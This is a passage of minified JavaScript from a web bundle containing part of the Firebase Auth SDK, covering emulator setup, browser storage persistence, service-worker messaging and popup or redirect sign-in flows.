this.assertedPersistence.setCurrentUser(e):yield this.assertedPersistence.removeCurrentUser()})}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return D(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=Dw(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}_getAdditionalHeaders(){return p(this,null,function*(){var e;let n={"X-Client-Version":this.clientVersion};this.app.options.appId&&(n["X-Firebase-gmpid"]=this.app.options.appId);let r=yield(e=this.heartbeatServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getHeartbeatsHeader();r&&(n["X-Firebase-Client"]=r);let i=yield this._getAppCheckToken();return i&&(n["X-Firebase-AppCheck"]=i),n})}_getAppCheckToken(){return p(this,null,function*(){var e;let n=yield(e=this.appCheckServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getToken();return n?.error&&Ox(`Error while retrieving App Check token: ${n.error}`),n?.token})}};function Sf(t){return xe(t)}var Uc=class{constructor(e){this.auth=e,this.observer=null,this.addObserver=NI(n=>this.observer=n)}get next(){return D(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}};var Tf={loadJS(){return p(this,null,function*(){throw new Error("Unable to load external scripts")})},recaptchaV2Script:"",recaptchaEnterpriseScript:"",gapiScript:""};function Zx(t){Tf=t}function Qx(t){return Tf.loadJS(t)}function Jx(){return Tf.gapiScript}function bw(t){return`__${t}${Math.floor(Math.random()*1e6)}`}function Af(t,e){let n=zo(t,"auth");if(n.isInitialized()){let i=n.getImmediate(),o=n.getOptions();if(mi(o,e??{}))return i;Dn(i,"already-initialized")}return n.initialize({options:e})}function Xx(t,e){let n=e?.persistence||[],r=(Array.isArray(n)?n:[n]).map(qt);e?.errorMap&&t._updateErrorMap(e.errorMap),t._initializeWithPersistence(r,e?.popupRedirectResolver)}function Mf(t,e,n){let r=Sf(t);D(r._canInitEmulator,r,"emulator-config-failed"),D(/^https?:\/\//.test(e),r,"invalid-emulator-scheme");let i=!!n?.disableWarnings,o=Sw(e),{host:s,port:a}=eO(e),c=a===null?"":`:${a}`;r.config.emulator={url:`${o}//${s}${c}/`},r.settings.appVerificationDisabledForTesting=!0,r.emulatorConfig=Object.freeze({host:s,port:a,protocol:o.replace(":",""),options:Object.freeze({disableWarnings:i})}),i||tO()}function Sw(t){let e=t.indexOf(":");return e<0?"":t.substr(0,e+1)}function eO(t){let e=Sw(t),n=/(\/\/)?([^?#/]+)/.exec(t.substr(e.length));if(!n)return{host:"",port:null};let r=n[2].split("@").pop()||"",i=/^(\[[^\]]+\])(:|$)/.exec(r);if(i){let o=i[1];return{host:o,port:JI(r.substr(o.length+1))}}else{let[o,s]=r.split(":");return{host:o,port:JI(s)}}}function JI(t){if(!t)return null;let e=Number(t);return isNaN(e)?null:e}function tO(){function t(){let e=document.createElement("p"),n=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",n.position="fixed",n.width="100%",n.backgroundColor="#ffffff",n.border=".1em solid #000000",n.color="#b50000",n.bottom="0px",n.left="0px",n.margin="0px",n.zIndex="10000",n.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}typeof console<"u"&&typeof console.info=="function"&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."),typeof window<"u"&&typeof document<"u"&&(document.readyState==="loading"?window.addEventListener("DOMContentLoaded",t):t())}var Bc=class{constructor(e,n){this.providerId=e,this.signInMethod=n}toJSON(){return Gt("not implemented")}_getIdTokenResponse(e){return Gt("not implemented")}_linkToIdToken(e,n){return Gt("not implemented")}_getReauthenticationResolver(e){return Gt("not implemented")}};function ef(t,e){return p(this,null,function*(){return jx(t,"POST","/v1/accounts:signInWithIdp",wf(t,e))})}var $c=class{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}};var uf=class extends $c{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}};var Qo=class t{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static _fromIdTokenResponse(e,n,r,i=!1){return p(this,null,function*(){let o=yield wi._fromIdTokenResponse(e,r,i),s=XI(r);return new t({user:o,providerId:s,_tokenResponse:r,operationType:n})})}static _forOperation(e,n,r){return p(this,null,function*(){yield e._updateTokensIfNecessary(r,!0);let i=XI(r);return new t({user:e,providerId:i,_tokenResponse:r,operationType:n})})}};function XI(t){return t.providerId?t.providerId:"phoneNumber"in t?"phone":null}var df=class t extends ot{constructor(e,n,r,i){var o;super(n.code,n.message),this.operationType=r,this.user=i,Object.setPrototypeOf(this,t.prototype),this.customData={appName:e.name,tenantId:(o=e.tenantId)!==null&&o!==void 0?o:void 0,_serverResponse:n.customData._serverResponse,operationType:r}}static _fromErrorAndOperation(e,n,r,i){return new t(e,n,r,i)}};function Tw(t,e,n,r){return(e==="reauthenticate"?n._getReauthenticationResolver(t):n._getIdTokenResponse(t)).catch(o=>{throw o.code==="auth/multi-factor-auth-required"?df._fromErrorAndOperation(t,o,e,r):o})}function nO(t,e,n=!1){return p(this,null,function*(){let r=yield Ko(t,e._linkToIdToken(t.auth,yield t.getIdToken()),n);return Qo._forOperation(t,"link",r)})}function rO(t,e,n=!1){return p(this,null,function*(){let{auth:r}=t;if(Ht(r.app))return Promise.reject(or(r));let i="reauthenticate";try{let o=yield Ko(t,Tw(r,i,e,t),n);D(o.idToken,r,"internal-error");let s=Cf(o.idToken);D(s,r,"internal-error");let{sub:a}=s;return D(t.uid===a,r,"user-mismatch"),Qo._forOperation(t,i,o)}catch(o){throw o?.code==="auth/user-not-found"&&Dn(r,"user-mismatch"),o}})}function iO(t,e,n=!1){return p(this,null,function*(){if(Ht(t.app))return Promise.reject(or(t));let r="signIn",i=yield Tw(t,r,e),o=yield Qo._fromIdTokenResponse(t,r,i);return n||(yield t._updateCurrentUser(o.user)),o})}function Nf(t,e,n,r){return xe(t).onIdTokenChanged(e,n,r)}function Rf(t,e,n){return xe(t).beforeAuthStateChanged(e,n)}var Hc="__sak";var Wc=class{constructor(e,n){this.storageRetriever=e,this.type=n}_isAvailable(){try{return this.storage?(this.storage.setItem(Hc,"1"),this.storage.removeItem(Hc),Promise.resolve(!0)):Promise.resolve(!1)}catch{return Promise.resolve(!1)}}_set(e,n){return this.storage.setItem(e,JSON.stringify(n)),Promise.resolve()}_get(e){let n=this.storage.getItem(e);return Promise.resolve(n?JSON.parse(n):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}};var oO=1e3,sO=10,aO=(()=>{class t extends Wc{constructor(){super(()=>window.localStorage,"LOCAL"),this.boundEventHandler=(n,r)=>this.onStorageEvent(n,r),this.listeners={},this.localCache={},this.pollTimer=null,this.fallbackToPolling=Cw(),this._shouldAllowMigration=!0}forAllChangedKeys(n){for(let r of Object.keys(this.listeners)){let i=this.storage.getItem(r),o=this.localCache[r];i!==o&&n(r,o,i)}}onStorageEvent(n,r=!1){if(!n.key){this.forAllChangedKeys((a,c,l)=>{this.notifyListeners(a,l)});return}let i=n.key;r?this.detachListener():this.stopPolling();let o=()=>{let a=this.storage.getItem(i);!r&&this.localCache[i]===a||this.notifyListeners(i,a)},s=this.storage.getItem(i);qx()&&s!==n.newValue&&n.newValue!==n.oldValue?setTimeout(o,sO):o()}notifyListeners(n,r){this.localCache[n]=r;let i=this.listeners[n];if(i)for(let o of Array.from(i))o(r&&JSON.parse(r))}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>{this.forAllChangedKeys((n,r,i)=>{this.onStorageEvent(new StorageEvent("storage",{key:n,oldValue:r,newValue:i}),!0)})},oO)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(n,r){Object.keys(this.listeners).length===0&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[n]||(this.listeners[n]=new Set,this.localCache[n]=this.storage.getItem(n)),this.listeners[n].add(r)}_removeListener(n,r){this.listeners[n]&&(this.listeners[n].delete(r),this.listeners[n].size===0&&delete this.listeners[n]),Object.keys(this.listeners).length===0&&(this.detachListener(),this.stopPolling())}_set(n,r){return p(this,null,function*(){yield An(t.prototype,this,"_set").call(this,n,r),this.localCache[n]=JSON.stringify(r)})}_get(n){return p(this,null,function*(){let r=yield An(t.prototype,this,"_get").call(this,n);return this.localCache[n]=JSON.stringify(r),r})}_remove(n){return p(this,null,function*(){yield An(t.prototype,this,"_remove").call(this,n),delete this.localCache[n]})}}return t.type="LOCAL",t})(),Aw=aO;var cO=(()=>{class t extends Wc{constructor(){super(()=>window.sessionStorage,"SESSION")}_addListener(n,r){}_removeListener(n,r){}}return t.type="SESSION",t})(),xf=cO;function lO(t){return Promise.all(t.map(e=>p(this,null,function*(){try{return{fulfilled:!0,value:yield e}}catch(n){return{fulfilled:!1,reason:n}}})))}var uO=(()=>{class t{constructor(n){this.eventTarget=n,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(n){let r=this.receivers.find(o=>o.isListeningto(n));if(r)return r;let i=new t(n);return this.receivers.push(i),i}isListeningto(n){return this.eventTarget===n}handleEvent(n){return p(this,null,function*(){let r=n,{eventId:i,eventType:o,data:s}=r.data,a=this.handlersMap[o];if(!a?.size)return;r.ports[0].postMessage({status:"ack",eventId:i,eventType:o});let c=Array.from(a).map(u=>p(this,null,function*(){return u(r.origin,s)})),l=yield lO(c);r.ports[0].postMessage({status:"done",eventId:i,eventType:o,response:l})})}_subscribe(n,r){Object.keys(this.handlersMap).length===0&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[n]||(this.handlersMap[n]=new Set),this.handlersMap[n].add(r)}_unsubscribe(n,r){this.handlersMap[n]&&r&&this.handlersMap[n].delete(r),(!r||this.handlersMap[n].size===0)&&delete this.handlersMap[n],Object.keys(this.handlersMap).length===0&&this.eventTarget.removeEventListener("message",this.boundEventHandler)}}t.receivers=[];return t})();function Mw(t="",e=10){let n="";for(let r=0;r<e;r++)n+=Math.floor(Math.random()*10);return t+n}var hf=class{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}_send(e,n,r=50){return p(this,null,function*(){let i=typeof MessageChannel<"u"?new MessageChannel:null;if(!i)throw new Error("connection_unavailable");let o,s;return new Promise((a,c)=>{let l=Mw("",20);i.port1.start();let u=setTimeout(()=>{c(new Error("unsupported_event"))},r);s={messageChannel:i,onMessage(d){let h=d;if(h.data.eventId===l)switch(h.data.status){case"ack":clearTimeout(u),o=setTimeout(()=>{c(new Error("timeout"))},3e3);break;case"done":clearTimeout(o),a(h.data.response);break;default:clearTimeout(u),clearTimeout(o),c(new Error("invalid_response"));break}}},this.handlers.add(s),i.port1.addEventListener("message",s.onMessage),this.target.postMessage({eventType:e,eventId:l,data:n},[i.port2])}).finally(()=>{s&&this.removeMessageHandler(s)})})}};function wt(){return window}function dO(t){wt().location.href=t}function Nw(){return typeof wt().WorkerGlobalScope<"u"&&typeof wt().importScripts=="function"}function hO(){return p(this,null,function*(){if(!navigator?.serviceWorker)return null;try{return(yield navigator.serviceWorker.ready).active}catch{return null}})}function fO(){var t;return((t=navigator?.serviceWorker)===null||t===void 0?void 0:t.controller)||null}function pO(){return Nw()?self:null}var Rw="firebaseLocalStorageDb",gO=1,zc="firebaseLocalStorage",xw="fbase_key",cr=class{constructor(e){this.request=e}toPromise(){return new Promise((e,n)=>{this.request.addEventListener("success",()=>{e(this.request.result)}),this.request.addEventListener("error",()=>{n(this.request.error)})})}};function qc(t,e){return t.transaction([zc],e?"readwrite":"readonly").objectStore(zc)}function mO(){let t=indexedDB.deleteDatabase(Rw);return new cr(t).toPromise()}function ff(){let t=indexedDB.open(Rw,gO);return new Promise((e,n)=>{t.addEventListener("error",()=>{n(t.error)}),t.addEventListener("upgradeneeded",()=>{let r=t.result;try{r.createObjectStore(zc,{keyPath:xw})}catch(i){n(i)}}),t.addEventListener("success",()=>p(this,null,function*(){let r=t.result;r.objectStoreNames.contains(zc)?e(r):(r.close(),yield mO(),e(yield ff()))}))})}function ew(t,e,n){return p(this,null,function*(){let r=qc(t,!0).put({[xw]:e,value:n});return new cr(r).toPromise()})}function vO(t,e){return p(this,null,function*(){let n=qc(t,!1).get(e),r=yield new cr(n).toPromise();return r===void 0?null:r.value})}function tw(t,e){let n=qc(t,!0).delete(e);return new cr(n).toPromise()}var yO=800,_O=3,IO=(()=>{class t{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then(()=>{},()=>{})}_openDb(){return p(this,null,function*(){return this.db?this.db:(this.db=yield ff(),this.db)})}_withRetries(n){return p(this,null,function*(){let r=0;for(;;)try{let i=yield this._openDb();return yield n(i)}catch(i){if(r++>_O)throw i;this.db&&(this.db.close(),this.db=void 0)}})}initializeServiceWorkerMessaging(){return p(this,null,function*(){return Nw()?this.initializeReceiver():this.initializeSender()})}initializeReceiver(){return p(this,null,function*(){this.receiver=uO._getInstance(pO()),this.receiver._subscribe("keyChanged",(n,r)=>p(this,null,function*(){return{keyProcessed:(yield this._poll()).includes(r.key)}})),this.receiver._subscribe("ping",(n,r)=>p(this,null,function*(){return["keyChanged"]}))})}initializeSender(){return p(this,null,function*(){var n,r;if(this.activeServiceWorker=yield hO(),!this.activeServiceWorker)return;this.sender=new hf(this.activeServiceWorker);let i=yield this.sender._send("ping",{},800);i&&!((n=i[0])===null||n===void 0)&&n.fulfilled&&!((r=i[0])===null||r===void 0)&&r.value.includes("keyChanged")&&(this.serviceWorkerReceiverAvailable=!0)})}notifyServiceWorker(n){return p(this,null,function*(){if(!(!this.sender||!this.activeServiceWorker||fO()!==this.activeServiceWorker))try{yield this.sender._send("keyChanged",{key:n},this.serviceWorkerReceiverAvailable?800:50)}catch{}})}_isAvailable(){return p(this,null,function*(){try{if(!indexedDB)return!1;let n=yield ff();return yield ew(n,Hc,"1"),yield tw(n,Hc),!0}catch{}return!1})}_withPendingWrite(n){return p(this,null,function*(){this.pendingWrites++;try{yield n()}finally{this.pendingWrites--}})}_set(n,r){return p(this,null,function*(){return this._withPendingWrite(()=>p(this,null,function*(){return yield this._withRetries(i=>ew(i,n,r)),this.localCache[n]=r,this.notifyServiceWorker(n)}))})}_get(n){return p(this,null,function*(){let r=yield this._withRetries(i=>vO(i,n));return this.localCache[n]=r,r})}_remove(n){return p(this,null,function*(){return this._withPendingWrite(()=>p(this,null,function*(){return yield this._withRetries(r=>tw(r,n)),delete this.localCache[n],this.notifyServiceWorker(n)}))})}_poll(){return p(this,null,function*(){let n=yield this._withRetries(o=>{let s=qc(o,!1).getAll();return new cr(s).toPromise()});if(!n)return[];if(this.pendingWrites!==0)return[];let r=[],i=new Set;if(n.length!==0)for(let{fbase_key:o,value:s}of n)i.add(o),JSON.stringify(this.localCache[o])!==JSON.stringify(s)&&(this.notifyListeners(o,s),r.push(o));for(let o of Object.keys(this.localCache))this.localCache[o]&&!i.has(o)&&(this.notifyListeners(o,null),r.push(o));return r})}notifyListeners(n,r){this.localCache[n]=r;let i=this.listeners[n];if(i)for(let o of Array.from(i))o(r)}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>p(this,null,function*(){return this._poll()}),yO)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(n,r){Object.keys(this.listeners).length===0&&this.startPolling(),this.listeners[n]||(this.listeners[n]=new Set,this._get(n)),this.listeners[n].add(r)}_removeListener(n,r){this.listeners[n]&&(this.listeners[n].delete(r),this.listeners[n].size===0&&delete this.listeners[n]),Object.keys(this.listeners).length===0&&this.stopPolling()}}return t.type="LOCAL",t})(),Ow=IO;var VW=bw("rcb"),jW=new ar(3e4,6e4);function wO(t,e){return e?qt(e):(D(t._popupRedirectResolver,t,"argument-error"),t._popupRedirectResolver)}var Jo=class extends Bc{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return ef(e,this._buildIdpRequest())}_linkToIdToken(e,n){return ef(e,this._buildIdpRequest(n))}_getReauthenticationResolver(e){return ef(e,this._buildIdpRequest())}_buildIdpRequest(e){let n={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(n.idToken=e),n}};function EO(t){return iO(t.auth,new Jo(t),t.bypassAuthState)}function CO(t){let{auth:e,user:n}=t;return D(n,e,"internal-error"),rO(n,new Jo(t),t.bypassAuthState)}function DO(t){return p(this,null,function*(){let{auth:e,user:n}=t;return D(n,e,"internal-error"),nO(n,new Jo(t),t.bypassAuthState)})}var pf=class{constructor(e,n,r,i,o=!1){this.auth=e,this.resolver=r,this.user=i,this.bypassAuthState=o,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(n)?n:[n]}execute(){return new Promise((e,n)=>p(this,null,function*(){this.pendingPromise={resolve:e,reject:n};try{this.eventManager=yield this.resolver._initialize(this.auth),yield this.onExecution(),this.eventManager.registerConsumer(this)}catch(r){this.reject(r)}}))}onAuthEvent(e){return p(this,null,function*(){let{urlResponse:n,sessionId:r,postBody:i,tenantId:o,error:s,type:a}=e;if(s){this.reject(s);return}let c={auth:this.auth,requestUri:n,sessionId:r,tenantId:o||void 0,postBody:i||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(yield this.getIdpTask(a)(c))}catch(l){this.reject(l)}})}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return EO;case"linkViaPopup":case"linkViaRedirect":return DO;case"reauthViaPopup":case"reauthViaRedirect":return CO;default:Dn(this.auth,"internal-error")}}resolve(e){bn(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){bn(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()}};var UW=new ar(2e3,1e4);var bO="pendingRedirect",Pc=new Map,gf=class t extends pf{constructor(e,n,r=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],n,void 0,r),this.eventId=null}execute(){return p(this,null,function*(){let e=Pc.get(this.auth._key());if(!e){try{let r=(yield SO(this.resolver,this.auth))?yield An(t.prototype,this,"execute").call(this):null;e=()=>Promise.resolve(r)}catch(n){e=()=>Promise.reject(n)}Pc.set(this.auth._key(),e)}return this.bypassAuthState||Pc.set(this.auth._key(),()=>Promise.resolve(null)),e()})}onAuthEvent(e){return p(this,null,function*(){if(e.type==="signInViaRedirect")return An(t.prototype,this,"onAuthEvent").call(this,e);if(e.type==="unknown"){this.resolve(null);return}if(e.eventId){let n=yield this.auth._redirectUserForId(e.eventId);if(n)return this.user=n,An(t.prototype,this,"onAuthEvent").call(this,e);this.resolve(null)}})}onExecution(){return p(this,null,function*(){})}cleanUp(){}};function SO(t,e){return p(this,null,function*(){let n=MO(e),r=AO(t);if(!(yield r._isAvailable()))return!1;let i=(yield r._get(n))==="true";return yield r._remove(n),i})}function TO(t,e){Pc.set(t._key(),e)}function AO(t){return qt(t._redirectPersistence)}function MO(t){return Oc(bO,t.config.apiKey,t.name)}function NO(t,e,n=!1){return p(this,null,function*(){if(Ht(t.app))return Promise.reject(or(t));let r=Sf(t),i=wO(r,e),s=yield new gf(r,i,n).execute();return s&&!n&&(delete s.user._redirectEventId,yield r._persistUserIfCurrent(s.user),yield r._setRedirectUser(null,e)),s})}var RO=10*60*1e3,mf=class{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let n=!1;return this.consumers.forEach(r=>{this.isEventForConsumer(e,r)&&(n=!0,this.sendToConsumer(e,r),this.saveEventToCache(e))}),this.hasHandledPotentialRedirect||!xO(e)||(this.hasHandledPotentialRedirect=!0,n||(this.queuedRedirectEvent=e,n=!0)),n}sendToConsumer(e,n){var r;if(e.error&&!Pw(e)){let i=((r=e.error.code)===null||r===void 0?void 0:r.split("auth/")[1])||"internal-error";n.onError(sr(this.auth,i))}else n.onAuthEvent(e)}isEventForConsumer(e,n){let r=n.eventId===null||!!e.eventId&&e.eventId===n.eventId;return n.filter.includes(e.type)&&r}hasEventBeenHandled(e){return Date.now()-this.lastProcessedEventTime>=RO&&this.cachedEventUids.clear(),this.cachedEventUids.has(nw(e))}saveEventToCache(e){this.cachedEventUids.add(nw(e)),this.lastProcessedEventTime=Date.now()}};function nw(t){return[t.type,t.eventId,t.sessionId,t.tenantId].filter(e=>e).join("-")}function Pw({type:t,error:e}){return t==="unknown"&&e?.code==="auth/no-auth-event"}function xO(t){switch(t.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return Pw(t);default:return!1}}function OO(n){return p(this,arguments,function*(t,e={}){return Ei(t,"GET","/v1/projects",e)})}var PO=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,kO=/^https?/;function FO(t){return p(this,null,function*(){if(t.config.emulator)return;let{authorizedDomains:e}=yield OO(t);for(let n of e)try{if(LO(n))return}catch{}Dn(t,"unauthorized-domain")})}function LO(t){let e=nf(),{protocol:n,hostname:r}=new URL(e);if(t.startsWith("chrome-extension://")){let s=new URL(t);return s.hostname===""&&r===""?n==="chrome-extension:"&&t.replace("chrome-extension://","")===e.replace("chrome-extension://",""):n==="chrome-extension:"&&s.hostname===r}if(!kO.test(n))return!1;if(PO.test(t))return r===t;let i=t.replace(/\./g,"\\.");return new RegExp("^(.+\\."+i+"|"+i+")$","i").test(r)}var VO=new ar(3e4,6e4);function rw(){let t=wt().___jsl;if(t?.H){for(let e of Object.keys(t.H))if(t.H[e].r=t.H[e].r||[],t.H[e].L=t.H[e].L||[],t.H[e].r=[...t.H[e].L],t.CP)for(let n=0;n<t.CP.length;n++)t.CP[n]=null}}function jO(t){return new Promise((e,n)=>{var r,i,o;function s(){rw(),gapi.load("gapi.iframes",{callback:()=>{e(gapi.iframes.getContext())},ontimeout:()=>{rw(),n(sr(t,"network-request-failed"))},timeout:VO.get()})}if(!((i=(r=wt().gapi)===null||r===void 0?void 0:r.iframes)===null||i===void 0)&&i.Iframe)e(gapi.iframes.getContext());else if(!((o=wt().gapi)===null||o===void 0)&&o.load)s();else{let a=bw("iframefcb");return wt()[a]=()=>{gapi.load?s():n(sr(t,"network-request-failed"))},Qx(`${Jx()}?onload=${a}`).catch(c=>n(c))}}).catch(e=>{throw kc=null,e})}var kc=null;function UO(t){return kc=kc||jO(t),kc}var BO=new ar(5e3,15e3),$O="__/auth/iframe",HO="emulator/auth/iframe",WO={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},zO=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);function GO(t){let e=t.config;D(e.authDomain,t,"auth-domain-config-required");let n=e.emulator?If(e,HO):`https://${t.config.authDomain}/${$O}`,r={apiKey:e.apiKey,appName:t.name,v:En},i=zO.get(t.config.apiHost);i&&(r.eid=i);let o=t._getFrameworks();return o.length&&(r.fw=o.join(",")),`${n}?${er(r).slice(1)}`}function qO(t){return p(this,null,function*(){let e=yield UO(t),n=wt().gapi;return D(n,t,"internal-error"),e.open({where:document.body,url:GO(t),messageHandlersFilter:n.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:WO,dontclear:!0},r=>new Promise((i,o)=>p(this,null,function*(){yield r.restyle({setHideOnLeave:!1});let s=sr(t,"network-request-failed"),a=wt().setTimeout(()=>{o(s)},BO.get());function c(){wt().clearTimeout(a),i(r)}r.ping(c).then(c,()=>{o(s)})})))})}var YO={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"},KO=500,ZO=600,QO="_blank",JO="http://localhost",Gc=class{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch{}}};function XO(t,e,n,r=KO,i=ZO){let o=Math.max((window.screen.availHeight-i)/2,0).toString(),s=Math.max((window.screen.availWidth-r)/2,0).toString(),a="",c=Object.assign(Object.assign({},YO),{width:r.toString(),height:i.toString(),top:o,left:s}),l=we().toLowerCase();n&&(a=yw(l)?QO:n),mw(l)&&(e=e||JO,c.scrollbars="yes");let u=Object.entries(c).reduce((h,[f,g])=>`${h}${f}=${g},`,"");if(Gx(l)&&a!=="_self")return eP(e||"",a),new Gc(null);let d=window.open(e||"",a,u);D(d,t,"popup-blocked");try{d.focus()}catch{}return new Gc(d)}function eP(t,e){let n=document.createElement("a");n.href=t,n.target=e;let r=document.createEvent("MouseEvent");r.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),n.dispatchEvent(r)}var tP="__/auth/handler",nP="emulator/auth/handler",rP=encodeURIComponent("fac");function iw(t,e,n,r,i,o){return p(this,null,function*(){D(t.config.authDomain,t,"auth-domain-config-required"),D(t.config.apiKey,t,"invalid-api-key");let s={apiKey:t.config.apiKey,appName:t.name,authType:n,redirectUrl:r,v:En,eventId:i};if(e instanceof $c){e.setDefaultLanguage(t.languageCode),s.providerId=e.providerId||"",jo(e.getCustomParameters())||(s.customParameters=JSON.stringify(e.getCustomParameters()));for(let[u,d]of Object.entries(o||{}))s[u]=d}if(e instanceof uf){let u=e.getScopes().filter(d=>d!=="");u.length>0&&(s.scopes=u.join(","))}t.tenantId&&(s.tid=t.tenantId);let a=s;for(let u of Object.keys(a))a[u]===void 0&&delete a[u];let c=yield t._getAppCheckToken(),l=c?`#${rP}=${encodeURIComponent(c)}`:"";return`${iP(t)}?${er(a).slice(1)}${l}`})}function iP({config:t}){return t.emulator?If(t,nP):`https://${t.authDomain}/${tP}`}var tf="webStorageSupport",vf=class{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=xf,this._completeRedirectFn=NO,this._overrideRedirectResult=TO}_openPopup(e,n,r,i){return p(this,null,function*(){var o;bn((o=this.eventManagers[e._key()])===null||o===void 0?void 0:o.manager,"_initialize() not called before _openPopup()");let s=yield iw(e,n,r,nf(),i);return XO(e,s,Mw())})}_openRedirect(e,n,r,i){return p(this,null,function*(){yield this._originValidation(e);let o=yield iw(e,n,r,nf(),i);return dO(o),new Promise(()=>{})})}_initialize(e){let n=e._key();if(this.eventManagers[n]){let{manager:i,promise:o}=this.eventManagers[n];return i?Promise.resolve(i):(bn(o,"If manager is not set, promise should be"),o)}let r=this.initAndGetManager(e);return this.eventManagers[n]={promise:r},r.catch(()=>{delete this.eventManagers[n]}),r}initAndGetManager(e){return p(this,null,function*(){let n=yield qO(e),r=new mf(e);return n.register("authEvent",i=>(D(i?.authEvent,e,"invalid-auth-event"),{status:r.onEvent(i.authEvent)?"ACK":"ERROR"}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:r},this.iframes[e._key()]=n,r})}_isIframeWebStorageSupported(e,n){this.iframes[e._key()].send(tf,{type:tf},i=>{var o;let s=(o=i?.[0])===null||o===void 0?void 0:o[tf];s!==void 0&&n(!!s),Dn(e,"internal-error")},gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){let n=e._key();return this.originValidationPromises[n]||(this.originValidationPromises[n]=FO(e)),this.originValidationPromises[n]}get _shouldInitProactively(){return Cw()||vw()||bf()}},kw=vf;var ow="@firebase/auth",sw="1.7.9";var yf=class{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){var e;return this.assertAuthConfigured(),((e=this.auth.currentUser)===null||e===void 0?void 0:e.uid)||null}getToken(e){return p(this,null,function*(){return this.assertAuthConfigured(),yield this.auth._initializationPromise,this.auth.currentUser?{accessToken:yield this.auth.currentUser.getIdToken(e)}:null})}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;let n=this.auth.onIdTokenChanged(r=>{e(r?.stsTokenManager.accessToken||null)});this.internalListeners.set(e,n),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();let n=this.internalListeners.get(e);n&&(this.internalListeners.delete(e),n(),this.updateProactiveRefresh())}assertAuthConfigured(){D(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}};function oP(t){switch(t){case"Node":return"node";case"ReactNative":return"rn";case"Worker":return"webworker";case"Cordova":return"cordova";case"WebExtension":return"web-extension";default:return}}function 